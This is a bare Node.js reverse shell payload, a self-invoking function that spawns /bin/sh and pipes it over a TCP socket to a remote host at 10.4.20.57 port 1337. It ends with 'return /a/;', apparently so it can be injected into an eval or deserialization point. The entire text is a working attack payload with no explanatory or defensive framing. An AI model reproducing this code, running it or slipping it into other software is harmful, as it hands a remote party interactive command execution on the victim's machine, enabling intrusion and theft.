(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client = client.ref();
    client.connect(1337, "10.4.20.57", function(){
        client.pipe(sh.stdin);
    });

    sh.stdout.on('data', (data) => {
      client.write(data);
    });
    sh.stderr.on('data', (data) => {
      client.write(data);
    });

    client.on('close', function() {
        console.log('Connection closed', client.destroyed);
    });

    return /a/;
})();